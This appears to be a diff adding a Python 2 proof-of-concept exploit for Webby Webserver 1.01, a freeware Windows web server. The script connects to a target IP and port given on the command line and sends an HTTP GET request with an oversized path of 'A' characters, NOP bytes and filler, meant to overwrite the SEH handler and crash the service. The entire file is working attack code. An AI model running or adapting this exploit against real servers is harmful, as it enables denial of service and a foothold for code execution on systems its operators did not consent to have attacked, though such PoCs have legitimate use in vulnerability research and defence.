@@ -1,0 +1,56 @@
+#!/usr/bin/python
+
+##POC details:
+##
+##SEH overwritten
+##
+##contact: 	m1k3@m1k3.at
+##		http://www.s3cur1ty.de
+
+##App detail:
+##
+#http://www.shareware.de/webby-webserver/
+#Version		1.01
+#Autor 		Timo Gaik
+#Lizenzart	Freeware
+#Plattformen	Win XP, Win 98, Win ME
+#Letztes Update	19.10.2004
+#Dateigroesse	701 KB
+
+import socket
+import sys
+import os.path
+import time
+
+if len(sys.argv) < 2:
+	print "Usage: webby.py <IP-Adr> <port>"
+	sys.exit(0)
+
+ips = sys.argv[1]
+port = int(sys.argv[2])
+
+string = "A"*790
+string += "\x90"*4	
+string += "\x42"*105		
+
+method = "GET"
+print "starting POC for:", ips
+print ""
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+try:
+	connect=s.connect((ips, port))
+except:
+	print "no connection possible"
+	sys.exit(1)
+
+payload = method + ' http://'+ ips + '/' + string + ' HTTP/1.0\x0d\x0a\x0d\x0a'
+
+print "\r\nsending payload"
+print "\n\rusing methode %s with buffersize of: %s" % (method,str(len(string)))
+print "..."
+
+print payload
+s.send(payload)
+print "finished kicking method %s with payload %s" % (method,payload)
+print "... the service should be crashed ... check SEH"
